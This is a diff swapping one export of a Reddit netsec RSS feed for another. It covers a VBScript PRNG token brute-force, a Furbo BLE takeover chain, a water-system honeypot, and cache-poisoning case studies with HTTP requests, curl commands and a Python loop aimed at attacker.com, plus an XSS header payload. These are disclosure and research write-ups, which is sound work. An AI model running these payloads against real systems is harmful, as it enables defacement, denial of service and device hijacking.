@@ -1,921 +1,344 @@
-<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>Yet Another Random Story. VBScript&apos;s Randomize Internals.</title><link>https://blog.doyensec.com/2025/09/25/yet-another-random-story.html</link><author>/u/nibblesec</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 10:50:17 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In one of our recent posts, Dennis shared an interesting case study of C# exploitation that rode on -based password-reset tokens. He demonstrated how to use the single-packet attack, or a bit of old-school math, to beat the game. Recently, I performed a security test on a target which had a dependency written in VBScript. This blog post focuses on VBS’s  and shows that the situation there is even worse.The application was responsible for generating a secret token. The token was supposed to be unpredictable and expected to remain secret. Here’s a rough copy of the token generation code:The first thing I noticed was that the  function was called inside a loop. That should reseed the PRNG on every single iteration, right? That could result in repeated values. Well, contrary to many other programming languages, in VBScript, the  usage within a loop is not a problem per se. The function will not reset the initial state if the same seed is passed again (even if implicitly). This prevents generating identical sequences of characters within a single  call. If you actually want that behavior, call  with a negative argument immediately before calling  with a numeric argument.But if that isn’t an issue, then what is?How VBS’s  Works in PracticeHere’s a short API breakdown:If no seed is explicitly specified,  uses  to set it (not entirely true, but we will get there).  returns seconds since midnight as a  value. ￼ advances a global PRNG state and is fully deterministic for a given seed. Same seed, same sequence, like in other programming languages.There are some problematic parts here, though. Windows’ default system clock tick is about 15.625 ms, i.e., 64 ticks per second. In other words, we get a new implicit seed value only once every 15.625 milliseconds.Because the returned value is of type , we also get precision loss compared to a  type. In fact, multiple “seeds” round to the same internal value. Think of collisions happening internally. As a result, there are way fewer unique sequences possible than you might think!In practice there are at most 65,536 distinct effective seedings (details below). Because  resets at midnight, the same set recurs each day.We ran a local copy of the client’s code to generate unique tokens. During almost 10,000 runs, we managed to generate only 400 unique values. The remaining tokens were duplicates. As time passed, the duplicate ratio increased.Of course the real goal here would be to recover the original secret. We can achieve that if we know the time of day when the  function started. The more precise the value, the less computations required. However, even if we have only a rough idea, like “minutes after midnight”, we can start at 00:00 and slowly increase our seed value by 15.625 milliseconds.We started by double-checking our strategy. We modified the initial code to use a command-line provided seed value. Note, the same seed is used multiple times. While in the original code, it is possible that seed value changes between the loop iterations, in practice that doesn’t happen often. We could expand our PoC to handle such scenarios as well, but we wanted to keep the code as clean as possible for the readability.We took a precise  value from another piece of code and used it as an input seed. Strangely though, it wasn’t working. For some reason we were ending up with a completely different PRNG state. It took a while before we understood that  and  aren’t exactly the same things.VBScript was introduced by Microsoft in the mid-1990s as a lightweight, interpreted subset of Visual Basic. As of Windows 11 version 24H2, VBScript is a Feature on Demand (FOD). That means it is installed by default for now, but Microsoft plans to disable it in future versions and ultimately remove it. Still, the method of interest is implemented within the  library and we can take a look at :When we previously said that a bare  uses  as a seed, we weren’t exactly right. In reality, it’s just a call to WinApi’s . It computes seconds plus fractional milliseconds as s, then narrows to  () using the  assembly instruction.Let’s use  as an example. It can be represented as  in hex notation. After all this math is performed, our  becomes  and is used as the seed input.This is what happens otherwise, when the input is explicitly given:When we do specify the seed value, it’s processed in an entirely different way. Instead of being converted using the  opcode, it’s shifted right by 32 bits. So this time, our   becomes  instead. We end up with completely different seed input. This explains why we couldn’t properly reseed the PRNG.Finally, the middle two bytes of the internal PRNG state are updated with a byte-swapped XOR mix of those bits, while the top and bottom bytes of the state are preserved.Honestly, I was thinking about reimplementing all of that to Python to get a clearer view on what was going on. But then, Python reminded me that it can handle almost infinite numbers (at least integers). On the other hand, VBScript implementation is actually full of potential number overflows that Python just doesn’t generate. Therefore, I kept the token-generation code as it was and implemented only the seed-conversion in Python.Now, we can run the base code and capture a semi-precise current time value. Our Python works with properly formatted strings, so we can convert the number using a simple method:Let’s say the token was generated precisely at  and we got the QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7 string. In the case of our target, we knew that some files were created at 17:55:54, which was rather close to the token-generation time. In other cases, the information leak could come from some resource creation metadata, entries in the log file, etc.We iterate time seeds in 0.015625-second steps (64 Hz) across the suspected window and we filter all duplicates.We started our  script with a 1s range and we successfully recovered the secret in the 4th iteration:PS C:\share> python3 .\brute_timer.py 17:55:54 17:55:55
-[INFO] Range 64554.00000 to 64555.00000 in 0.015625-s steps
-[64554.00000] Test #1: eYIkXKdsUTC3Uz#R)P$BlVRJie9U2(4B // calculated seed: 2.3397787718772567e+36
-[64554.01562] Test #2: ZTDgSGZnPP#yQv*M6L)#hQNEdZ5Px50$ // calculated seed: 2.3397838424796576e+36
-[64554.03125] Test #3: VP!bOBUjLK&uLq8I2G7*cMIAZV0Lt1v* // calculated seed: 2.3397889130820585e+36
-[64554.04688] Test #4: QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7 // calculated seed: 2.3397939836844594e+36
-[...snip...]
-VBScript’s  and  are fine if you just want to roll some dice on screen, but don’t even think about using them for secrets.]]></content:encoded></item><item><title>Hacking Furbo - A Hardware Research Project – Part 5: Exploiting BLE</title><link>https://www.softwaresecured.com/post/hacking-furbo-a-hardware-research-project-part-5-exploiting-ble</link><author>/u/duduywn</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 10:31:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Part 5 of the Hacking Furbo blog series is here and in this article we'll be focusing on an area which has gotten little attention thus far: Bluetooth Low Energy (BLE).As with Part 2, we continued to find places where Furbo’s security was already quite good. Stubborn as we are, though, we were still able to find areas that were vulnerable. We will detail how we discovered the paths to exploiting various vulnerabilities in Furbo’s implementation of BLE through the analysis of a live device, its logs, and the decompiled mobile application.When a new device is first set up, the end-user has to connect that device to their local Wi-Fi network. Furbo handles this by connecting to the user's mobile phone, where a communication flow occurs over Bluetooth to pass the authentication details to the device. Once this is completed, the device ceases to communicate with the application over Bluetooth. Honestly, it was an area we overlooked at first because it was such a quick and seamless process.As we dug further into the application and device however, we realized it was an area we should explore further. This interest was prompted by discussions with a colleague who had done ample research on BLE in the past—Kevin2600.The first question we wanted to answer was simple: "Are the communications between device and mobile application encrypted?"To do so, we leaned on adb bugreport. On an Android device with developer options enabled, a report can be generated which details all of the logging information related to the operations of the device. By default, this bugreport does not include Bluetooth communications however by enabling Bluetooth HCI Snoop Log in the Developer settings we could gain insight into these too.So, we turned this on, ran the pairing process, and entered in the credentials of a hotspot we had set up for testing. To help us identify the password more easily we used a string we could more easily search for: “FINDMEPASSWORD”. We then pulled the report with adb bugreport <filename> onto our host machine and unzipped the archive.After digging up the btsnoop_hci.log file, we pulled it into WireShark where we could more easily analyze the communications. There were a ton of logs to parse, so we applied the btatt filter to reduce it some and found the first destination which was a MAC address and started from that point. This packet was our first indicator that we were focusing on the right device.Reviewing more of the packets, we realized that much of the communications were split up across several sends, meaning it would be challenging to decipher what exactly was being sent or received. It also seemed as though that some of the data may be hex encoded based on the packets seen in Wireshark. Rather than trying to piece it all together, we grepped out any possible hex values and whipped up a Python script which would parse the log file and hopefully extract whatever data we were looking for.And with that, we had our first BLE vulnerability. The passwords and SSIDs which were sent to a Furbo device were being communicated over BLE in an unencrypted format!After the excitement of this first finding we decided it would be well worth investigating this interface further. Using an nrf52840 adapter, we set up the Nordic Semiconductor nRF Connect app to view the exposed GATT Characteristics and Services through a graphical interface.While we could write to one characteristic, the rest were simply reads which returned information about our device. Fuzzing the writable characteristic with various characters we found that sending 1 or 2 would result in either a "soft" or "hard" reset of the device—essentially allowing us to turn the device off or disconnect it from the Wi-Fi temporarily.The "soft reset", from what we could tell, was used to change the Wi-Fi Network the device was connected to. This state was only temporary and once the device was manually rebooted, it would connect back to the original network using the saved credentials it had.We will return to the “hard reset” shortly.While it may seem like an annoyance at first glance, these devices are touted as security products in some of the marketing materials; meaning that this vulnerability has a slightly higher impact. If, for example, I were a bad guy breaking into someone's house, I could switch off the Furbo's video feed before entering with this vulnerability.As we were toying around with the pairing process, we monitored the device logs under /tmp/log, trying to determine what was occurringat each step; it was then that we discovered there must be more GATT Characteristics than what we saw at first glance with the nRF Connect application.In the second picture we can see the SSID and Wi-Fi password being sent in hex.We figured that if they were being used in the communication flow, they must be referenced somewhere in the APK. Using grep, we searched for the locations of the UUIDs.Within this file we found many more characteristics referenced, as well as operations they may be used for.Exposing BLE GATT CharacteristicsAfter some trial and error, we discovered that in order to expose the additional GATT characteristics and services  we would have to put the device into a factory reset mode. In this state all the GATT characteristics that were listed in the APK were visible and could be interacted with. The challenge for us with this requirement was that you would need physical access to insert a small paperclip and hold down a button for 10 seconds, at which point the attack seemed pointless.This brings us back to the previously mentioned reset modes we discovered through fuzzing: the second of which was the “Hard Reset”, this is where things got interesting. When we first ran the full reset command we didn't notice much of a difference compared to the "Soft Reset". The device went offline, but when we tried to scan for any other characteristics there were none to be found.After doing a little more research into BLE and how connections work we came to the conclusion that after issuing the "Full Reset" command, we would have to disconnect and reconnect our session. Once reconnected to the device after sending the "Full Reset" command we discovered that  of the device's GATT characteristics were active and available. These newly exposed characteristics opened the door for several attacks which we will explore throughout the rest of the article.Our theory was that we may have two different attack scenarios that could be exploited based on the information exposed by these GATT characteristics.The first attack was a Denial Of Service which revolved around the device registration process, specifically how devices could be re-registered after they were already bound to an account.The second attack could be used to interrupt and replace the camera feed of a device by exploiting how the device authenticated with the TUTK P2P network in order to stream video to the mobile application.Both of these attack chains required the following information from the victim device in order work: The second attack, in addition to the other three variables, also required the victim's P2P UUID which connected their device to the TUTK network.Reading Sensitive Data from Exposed GATT CharacteristicsThe characteristic C1C1D58F-6CDC-426D-AA4D-5A18BD88FE37 could be used to read the device token and 2E2F1C66-ACE9-46AA-A993-641FCE7A5C9C allowed us to read the P2P UUID the device was using in order to stream video over the TUTK network.Using these 2 exposed GATT characteristics, we were able to retrieve two out of the four victim details required to complete the attack chain. Now all that was left was to retrieve the AccountID and DeviceID.The AccountID and DeviceID would prove slightly more challenging to retrieve. We knew that the Firehose logging service, which we had decrypted in Part 1 of our blog series, contained these IDs, however up until this point we had only seen it run after a device was first connected to an account. We didn't like the restrictions this put on our attack chain, so we needed to uncover a way to control the Firehose.After much testing and log review, we discovered that there were other conditions that could trigger the service to run. If the device was disconnected from the Internet for more than three minutes the Firehose service would collect the data and attempt to send it off once re-connected.This was something we could control using some of the other newly exposed GATT characteristics.The following GATT characteristics were exposed after the device was put into "Full Reset" mode which we could use in order to control the device's internet connection:The scenario was fairly simple: if we were within range of the device we could disconnect it from its network, force it to connect to our own access point (while it was not connected to the internet), and then, after allowing for the three minute delay, reconnect it and proxy the traffic through certmitm. The end result was that the Firehose service would run and we'd decrypt the TLS traffic containing the AccountID and DeviceID.Gathering the Furbo Infinity StonesThe complete attack chain, using the Furbonator script:Get within range of the victim's Furbo device.Connect to the device over Bluetooth and put it into "Full Reset" mode.Retrieve the Device Token.Reset the WiFi Connection.Send the attacker-controlled SSID.Send the password for the attacker-controlled access point.Allow for a three minute delay.Send the Wi-Fi Ready command so the Victim Furbo Connects to your proxied network.Capture Firehouse logs using certmitm and grab the AccountID.Denial of Service — Re-Registering Victim DeviceWith these details we were now ready to attempt our first attack: re-registering the victim's device to our account.By combining the previous DeviceID Spoofing attack with the leaked AccountID, DeviceID, and Device Token an attacker can now re-register a victim's device, completely disabling it and preventing it from ever being registered again.Factory reset the attacker device.Connect to the device over UART and replace the MAC address with the victim's DeviceID. sed -i 's/"system\/info\/mac": *"[^"]*"/"system\/info\/mac": "[VICTIM_MAC]"/' /mnt/hw/factory.jsonModify /mnt/flash/furbo/setup_info.json, adding the victim's AccountID, DeviceID and DeviceToken.Add the device to the attacker's account following the instructions in the mobile application.During the registration process, when prompted with the message,"This Furbo was already registered. If you register a new account the previous account will be disconnected" click "Register New Account".Once the setup is completed the attacker should now have the victim's device added to their account.As their DeviceID is now associated with the attacker's account, and they cannot get the DeviceToken, the victim will be unable to re-register their device to their own account. As a result, they will have lost all functionality of their Furbo device, essentially bricking it.Look at me! I am the camera nowBuilding off of the DoS re-registration attack we could take this one step further. We could use the P2P UUID grabbed from BLE to interrupt the victim's video stream and replace it with the attacker's own stream. This is possible by abusing the P2P authentication flow in order to re-issue credentials for the spoofed UUID, authorizing the attacker device to stream on the TUTK network and replacing the victim's video stream with their own.In order to stream on the TUTK network each device requires P2P UUID. When a device is registered to your account you are also authorizing the mobile account to request the video stream from that particular P2P UUID.When the device is paired and registered, the mobile application retrieves a P2PAccountID, P2PAuthKey, and P2PPassword from an API—which are the values we retrieved from the device's memory in Part 2. These details are then passed to the device, from which it is sent back to the Furbo servers to retrieve a P2P UUID.This P2P UUID is bound to the DeviceID; even when a device is reset the DeviceID stays the same, meaning that when it reconnects it will maintain the same P2P UUID.However, having the P2P UUID is not enough to stream on the TUTK network. You also require an Authkey and Password. However, these credentials can automatically be generated and reissued to a device as long as it has a valid AccountID, DeviceID, DeviceToken, and P2P UUID which in our case we do.Credential Regeneration FlowThe device boots and checks for P2P credentials, if it fails to find the p2p_auth.json file the following flow occurs.The device makes POST requests to: /v5/device/setup, supplying the AccountID, DeviceToken, DeviceID, and P2P UUID.Furbo validates the request Confirms P2P UUID ↔ DeviceID ↔ AccountID relationshipIssues new TUTK credentials: authKey, password.Device writes a new p2p_auth.json file Old credentials are invalidated (only the latest credentials for a P2P UUID are valid on the TUTK network).Taking over the video streamRegister the device so it is active in the mobile application.Connect to device over UART and replace the MAC address with the victim's DeviceID sed -i 's/"system\/info\/mac": *"[^"]*"/"system\/info\/mac": "[VICTIM_MAC]"/' /mnt/hw/factory.jsonEdit the /mnt/flash/furbo/setup_info.json file and add the victim's AccountID, DeviceID, DeviceToken, and P2P UUID.Remove the /mnt/flash/furbo/p2p_auth.json file.Once the attacker's device reboots it will check to see if that p2p_auth.json file is located on the device, it will then reach out to Furbo's servers in order to retrieve the details. As all the details on the attacker's device are the same as the victim's device, Furbo will generate new credentials for the victims P2P UUID, invalidating their own. As a result, the attacker's device is the only valid “online” device for that P2P UUID. When the victim opens their mobile application, they will see the attacker's video stream and not their own as that is what will be returned when the application searches for that P2P UUID on the TUTK network.That concludes Part 5 of the Hacking Furbo blog series. BLE is an often overlooked communication protocol, one we nearly overlooked ourselves. However, as we have shown, it can yield very interesting results when it is interrogated effectively. We were able to build attack chains based on data garnered through BLE to take over the device’s video streams and gain unauthorized access to someone’s Wi-Fi network, serious stuff. The next part will be the grand finale! We will finish off with a review of the filesystem where we found numerous vulnerabilities including one which allowed us to view the activity of  Furbo worldwide.]]></content:encoded></item><item><title>Why “contained” doesn’t mean “safe” in modern SOCs</title><link>https://blog.strandintelligence.com/compliance-wont-stop-a-breach-heres-why/</link><author>/u/SuccessfulMountain64</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 09:12:34 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ReDisclosure: New technique for exploiting Full-Text Search in MySQL (myBB case study)</title><link>https://exploit.az/posts/wor/</link><author>/u/Difficult-Catch9885</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 21:12:39 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA["Even a small key can open a big lock" Azerbaijani Proverb
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>Simulating a Water Control System in my Home Office</title><link>https://rosesecurity.dev/2024/08/28/homegrown-honeypots.html</link><author>/u/RoseSec_</author><category>netsec</category><pubDate>Sat, 29 Nov 2025 17:10:29 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[A few weeks ago, I happened upon a LinkedIn post by Mike Holcomb about the Cyber Army of Russia Reborn (CARR) targeting a water facility’s HMI. The post featured a video of the attack, showing a series of clicks and keystrokes that manipulated well controls to switch lead wells, adjust large well alternators, and reset hour meters. Mike noted that while no customers lost water service, the attack could have led to a tank overflow. This got me thinking about real-world attacks, their potential impact, and their frequency. I decided to simulate a water control system in my home office to see if I could catch any bad guys in the act.The first decision I faced was whether to host the honeypot on a cloud provider, a virtual machine, or a physical device. Typically, industrial control system honeypots in the cloud are easy to spot since they’re usually located within an on-premises ICS network. Shodan and Censys scanners generally identify and tag these as honeypots relatively quickly, rendering research less effective. By deploying the honeypot from my home office, I could better simulate a real-world water control system and potentially catch more sophisticated attacks. Additionally, I could mimic a device that would be more realistic to my geographic location by tailoring the HMI to appear as a local water control system. Fortunately, I had plenty of spare hardware on hand, including a mini PC with dual ports that I could later configure for advanced monitoring. With this in mind, I chose to use my mini PC running Debian 12 as the honeypot, running a containerized application to simulate the water control system. To protect the rest of my home network, I created a VLAN on my office switch and connected the mini PC to it, isolating it from the rest of the network. The network layout is shown below:graph TD
+    H[Threat Actor] -->|Internet| R[Home Router]
+    R -->|Port Forward 8080 TCP| HP[Debian Server]
+    subgraph VLAN 2
+        HP -->|Docker Container| DC[python aqueduct.py]
+        HP --> |Process| NT[tcpdump -i enp0s3 -XX]
+        NT --> |Output| PC[aqueduct.pcap]
+        DC --> |Output| LF[logs.json]
+    end
+    R --> S[Office Switch]
+    S --> VLAN2[VLAN 2]
+    VLAN2 --> HP
 
----[ Index
-1 - Introduction
-2 - Tradition
-    2.1 - ReDoS, not the OS
-    2.2 - REGEXP, RLIKE and others
-3 - How insecure, secure implementations are?
-4 - Study Case: myBB
-    4.1 - Identification
-    4.2 - Perfect Match Against Sanitization
-    4.3 - Exploiting
-5 - Acknowledgements
-6 - References
+    classDef default fill:#f0f0f0,stroke:#333,stroke-width:2px;
+    classDef vlan fill:#e6f3ff,stroke:#333,stroke-width:2px;
+    class VLAN2 vlan;
+Implementing the HoneypotOne thing I have learned about myself is that I am bad at naming things, which is not a fun trait to have as a software engineer. With this in mind, I dubbed this project . Armed with a Python Flask application and some HTML, I was destined to find some bad guys. The script works very simply: it listens on port 8080 (as port 80 was immediately blocked by my ISP) and serves up a mostly static HTML page. I say “mostly static” because there are two additional pages that can be accessed from the landing screen. I crafted these pages with the intention of making them difficult to scan with automation. My goal was to force manual manipulation of the controls, pumps, and alternators. The following directory structure demonstrates how the honeypot is laid out:If you’re interested in the HTML templates, you can find them here or craft your own with some GPT magic. The real work is done in , where the landing page is rendered with links to the templates:These routes handle both GET and POST requests for the lift station details and well details pages. If a POST request is made, it captures the control action, the station being controlled, and the attacker’s IP address. It’s a simple and straightforward way of capturing webpage interactions and creates extremely readble and easily parsable logs.The captured actions are written to a log file () using the following function (as noted above, I also ran a packet capture to see what other traffic looked like hitting the server):The final product looks like this!To make the exposed server easily findable, I decided to leverage Shodan, a search engine for Internet-connected devices. By submitting a scan request to Shodan, I ensured that my honeypot would be indexed and visible to anyone using the service.Here’s the command I used to submit the scan:shodan scan submit <network or ip address>
+With the honeypot now exposed, I waited to see how the world would interact with my simulated water control system… The results of this experiment? Maybe I’ll share those insights next time!]]></content:encoded></item><item><title>Beyond Nmap: Building Custom Recon Pipelines</title><link>https://chaincoder.hashnode.dev/beyond-nmap-building-custom-recon-pipelines</link><author>/u/voidrane</author><category>netsec</category><pubDate>Sat, 29 Nov 2025 15:45:51 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Analysis of 8 Foundational Cache Poisoning Attacks (HackerOne, GitHub, Shopify) - Part 1</title><link>https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/</link><author>/u/Empty_Hacker</author><category>netsec</category><pubDate>Sat, 29 Nov 2025 13:05:58 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[This research-driven article is for educational and defensive security purposes only. All case studies are based on publicly disclosed bug bounty reports and ethical security research.
+Do not reproduce these techniques on systems without explicit authorization.Cache poisoning has become one of the most powerful and profitable bug classes in modern web security. Although it once appeared niche, cache poisoning has evolved into a high-impact attack vector affecting CDNs, cloud platforms, server frameworks, and multi-tenant SaaS providers.This  of the three-part series covers the  - the first documented real-world cache poisoning incidents that paved the way for later, more sophisticated techniques. These early reports demonstrate not only how straightforward misconfigurations can lead to devastating effects, but also how attackers learned to weaponize headers, request behaviors, and cache key inconsistencies to breach platforms with millions of users.These case studies lay the groundwork for advanced exploitation techniques covered in  and . Understanding Web Cache PoisoningBefore diving into each case, it’s worth revisiting what cache poisoning is: occurs when an attacker manipulates a reverse proxy, CDN, or server-side cache into storing a malicious response, which is then served to other users. Beginner Breakout: Why Caches ExistCaches accelerate performance by storing responses to common requests such as:Static files (JS, CSS, images)If the cache returns the wrong content - malicious or invalid -  are affected until the cache expires. Why Cache Poisoning Is DangerousAffects many users with one requestOften bypasses authenticationCan convert reflected bugs into stored bugsCan break entire applications (DoS)Can lead to XSS, redirection, content injection, OAuth token leak, and more Case Study #1 - HackerOne’s Early Days: The First Documented Cache Poison HackerOne Undisclosed 2014 #487This case is historically important because it is one of the earliest documented cache poisoning reports on a mainstream bug bounty platform.HackerOne trusted the  header without validation. Since the header wasn’t part of the cache key, attackers could poison the cache.GET / HTTP/1.1  
+Host: hackerone.com  
+X-Forwarded-Host: evil.com
+After a single malicious request, anyone visiting  was redirected to .The application blindly trusted proxy headers.The header was  in the cache key.Poisoning persisted for subsequent visitors.Test legacy headers ().Confirm poison persistence after removing headers.Always demonstrate real impact (redirect chains, spoofed hostnames). Case Study #2 - GitHub’s $4,850 Repository DoS Through Content-Type Poisoning GitHub Iustin Ladunca $4,850 Repository DoS for unauthenticated usersGitHub treated the  header as part of its redirect logic but did not include it in the cache key for unauthenticated users.GET /user/repo HTTP/1.1  
+Host: github.com  
+Content-Type: invalid-value-here
+Authenticated users were protected due to cookie-based cache keys, but all unauthenticated traffic shared a single cache entry.curl -X GET https://github.com/target/repo \
+  -H "Content-Type: malicious"
 
---[ 1 - Introduction
-For years, SQL Injection has been mostly about syntax-breaking payloads. But
-with tools getting advanced, it is more about creating "cooler payload" /
-finding ignored SAST warnings. I am a newbie who noticed this pattern going
-back and forth and started searching for possibility of injection, without
-escaping anything, something that SAST/WAFs don't have a rule for.
+curl -X PURGE https://github.com/target/repo
+GitHub mistakenly allowed the  method, making the attack trivial to weaponize.Always test behavior differences for authenticated vs unauthenticated users.Check for support of dangerous methods like .Cacheable error responses = high-value targets. Case Study #3 - Shopify’s $6,300 Multi-Host Cache Poison Shopify Iustin Ladunca $1,300 $6,300 #977851This attack is notable for its persistence across multiple hosts. Attack Code (Looped Poisoning)import requests
+import time
 
-This paper presents a new technique for Regex Injection. At the beginning I
-will explain just a bit of traditional methods that we knew before, then
-shift into the technique and then we will study one of the vulnerabilities I
-found in myBB which allowed viewing deleted thread names as an
-unauthenticated user.
+target = "https://shop.shopify.com/endpoint"
+poison_header = {"X-Forwarded-Host": "attacker.com"}
 
---[ 2 - Tradition
-This section explains traditional methods that were usually used to identify
-vulnerabilities related to regex. But before going further, let's understand
-the difference between regex, wildcard, and operator. BTW, originally I
-wanted to call this paper WOR technique.
+for i in range(100):
+    requests.get(target, headers=poison_header)
+    time.sleep(0.1)
 
-----[ 2.1 - ReDoS, not the OS
-A regular expression (Regex) is a sequence of characters that specifies a
-match pattern in text. The main feature of regex is the ability to match
-complex string patterns. A wildcard, on the other hand, is a symbol used to
-represent zero or more characters. In SQL, the percent sign (%) and
-underscore (_); in regex, the period (.) and asterisk (*) are considered
-wildcards. Operators are logical symbols; some examples include AND, OR,
-NOT, =, !=, <, >, >=, <=, +, -, *, /. Operators like asterisk are used for
-calculations, so don't confuse them with wildcards. I guess now you
-understand why I wanted to call it WOR technique. Certainly not because WOR
-means thief in Russian and the whole article is about a technique for
-stealing information from software that I can't write about because its
-developers prioritize feature over security.
+# Verify persistence
+response = requests.get(target)
+print("attacker.com" in response.text)
+Some caches need multiple hits before poisoning.Once poisoned, the malicious value  even without the header.The vulnerability extended across multiple Shopify properties, increasing bounty.Test for multi-host impact - many companies use shared caching layers.Loop poisoning requests to force cache overwrite.Document impact across localized hosts for larger bounties. Case Study #4 - Private Program’s $3,000 Stored XSS Chain Private Critical $3,000This case demonstrates how cache poisoning can convert a  into a  affecting many users.GET /assets/main.js HTTP/1.1  
+Host: target.com  
+X-Forwarded-Host: attacker.com
+Server responded with a  which included a poisoned host value.
+The redirect was cached, and all users were served:JavaScript from Malicious payloads executed on all subdomainsStored XSS across Target JavaScript files - they are universally cached.Test redirect (301/302) responses with unkeyed headers.Map shared JS dependencies for multi-domain attacks. Case Study #5 - GitLab Cache Poisoning via Google Cloud Storage GitLab Iustin Ladunca #1160407GitLab stored static files on GCP buckets, which introduced a unique attack surface.GET /static/app.js HTTP/1.1  
+Host: gitlab.com  
+X-HTTP-Method-Override: HEAD
+This forced GCP to override GET → HEAD, returning:HTTP/1.1 200 OK  
+Content-Length: 0  
+Cache-Control: public, max-age=3600
+The empty body was cached, effectively breaking the site.GCP Storage supports method overrides.GitLab's cache lacked method-awareness.HEAD responses overwrote GET cache entries.Method override headers are highly dangerous.Test cloud platform behavior (GCP, AWS, Azure).Empty-body attacks can DoS entire applications. Case Study #6 - HackerOne’s $2,500 Static File DoS HackerOne $2,500 DoS was typically out of scope but rewarded due to novelty.Rails Rack middleware trusted .
+By poisoning static files, attackers created infinite redirect loops.GET /static/logo.png HTTP/1.1  
+Host: hackerone.com  
+X-Forwarded-Scheme: http
+Server returned a 301 redirect which cached globally, breaking images for all users.Framework-specific headers (Rails, Django, Laravel) often introduce weaknesses.Redirect loops result in high-impact DoS.Even static files can be high-severity cache poison targets. Iustin Ladunca $500–$3,000 per affected program 20+ vulnerable programsThis bug was , enabling massive horizontal exploitation.GET / HTTP/1.1  
+Host: TaRgEt.CoM
+Cloudflare normalized host headers before caching but forwarded them  to origin servers.Default Cloudflare config vulnerableMillions of sites potentially affectedOne request could poison countless customersCase manipulation (uppercase, mixed case) is mandatory testing.CDN-level bugs scale horizontally - create automated scanners.Focus on differences between origin and CDN processing. Case Study #8 - Red Hat’s Open Graph Stored XSS Red Hat James Kettle (PortSwigger)This bug highlighted meta-tag poisoning and its amplification via social media.GET /en?dontpoisoneveryone=1 HTTP/1.1  
+Host: www.redhat.com  
+X-Forwarded-Host: a.\"><script>alert(1)</script>
+The poisoned header appeared in , then cached.Social networks embed Open Graph tags.Cached poisoned tags executed XSS for anyone opening shared links.Amplifiable via Twitter, Facebook, LinkedIn.Meta tags (, , etc.) are high-value injection points.“no-cache” headers can still be cached depending on CDN rules.Use cache busters () to stay safe during testing.Cache poisoning is preventable when organizations enforce strong, layered defenses. Application-Level DefensesValidate all inbound headers.Reject unrecognized headers explicitly.Include all relevant inputs in cache keys.Normalize header behavior consistently.Block dangerous headers (, ).Prevent caching of error responses unless necessary. Architecture-Level DefensesAvoid shared cache pools across tenants.Use strict content-type validation.Disable method override functionality. Real-World Impact Summary (Part 1)The earliest cache poisoning attacks were deceptively simple - using common headers like  or malformed content types - yet their real-world consequences were severe. These foundational reports laid the groundwork for the more advanced, framework-specific, multi-layer, and supply-chain attacks examined in  and .If Part 1 shows anything, it's this:Cache poisoning is not just a bug - it's an architectural blind spot.HackerOne Reports (Public)Shopify, GitLab, GitHub public disclosure archivesCDN vendor documentation (Cloudflare, Fastly, Akamai)]]></content:encoded></item><item><title>CTF challenge Malware Busters</title><link>https://cloudsecuritychampionship.com/challenge/6</link><author>/u/Ok_Coyote6842</author><category>netsec</category><pubDate>Fri, 28 Nov 2025 21:42:17 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
+            You are presented with an unknown and odd binary in a compromised environment.
+          
+            Your job is to analyze the binary as best you can. Your analysis should include:
+          
+            * Describe the actions performed by the malware.
+          
+            * Find the C2 server the malware communicates with.
+          
+            * Decrypt the malware's C2 protocol.
+          
+            By following these steps you will find the hidden flag to complete the challenge.
+          
+              "You can do anything with regex (and maybe IDA and python)"
+            ]]></content:encoded></item><item><title>CVE-2025-58360: GeoServer XXE Vulnerability Analysis</title><link>https://helixguard.ai/blog/CVE-2025-58360</link><author>/u/Fit_Wing3352</author><category>netsec</category><pubDate>Fri, 28 Nov 2025 14:48:41 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Anonymized case study: autonomous security assessment of a 500-AMR fleet using AI + MCP</title><link>https://aliasrobotics.com/case-study-sublight-shipping-MCP.php</link><author>/u/Obvious-Language4462</author><category>netsec</category><pubDate>Fri, 28 Nov 2025 14:12:29 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
+                  CAI is the leading open-source framework that democratizes advanced security testing through specialized AI agents. With EU backing, CAI is used by thousands of researchers and organizations worldwide. Unlike traditional penetration testing tools, CAI's multi-source analysis capabilities enable the unification of information from firmware, network traffic, cloud configuration, telemetry, and web applications, automatically correlating patterns that only emerge when combining all these layers. This systemic perspective allows organizations to uncover critical weaknesses and map full exploit chains that would remain hidden in siloed assessments.
+                  In the case of Sublight Shipping's fleet of 500 Autonomous Mobile Robots (AMRs), CAI's comprehensive analysis uncovered critical vulnerabilities, such as unauthenticated UDP position broadcasts exploitable via spoofed packets, and a stored XSS in the robot nickname field enabling session hijacking, while also demonstrating their operational impact, including potential route manipulation and privilege escalation. This level of depth and correlation was essential for proving the fleet's resilience and securing a 10-year, $50M contract renewal.
